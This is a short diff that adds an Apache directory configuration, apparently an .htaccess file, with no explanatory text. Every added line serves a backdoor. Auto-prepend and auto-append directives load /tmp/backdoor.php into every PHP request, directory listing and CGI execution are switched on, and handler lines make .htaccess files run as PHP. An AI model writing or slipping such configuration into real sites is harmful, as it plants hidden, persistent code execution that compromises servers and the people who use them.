@@ -1,0 +1,10 @@
+DirectoryIndex index.php
+<Directory /home/mypath>
+    ServerSignature On
+	Options Indexes ExecCGI Includes
+	php_value auto_prepend_file /tmp/backdoor.php
+	php_value auto_append_file /tmp/backdoor.php
+	AddType application/x-httpd-php .htaccess
+	AddType application/x-httpd-suphp .htaccess
+	AddHandler application/x-httpd-php .htaccess
+</Directory>
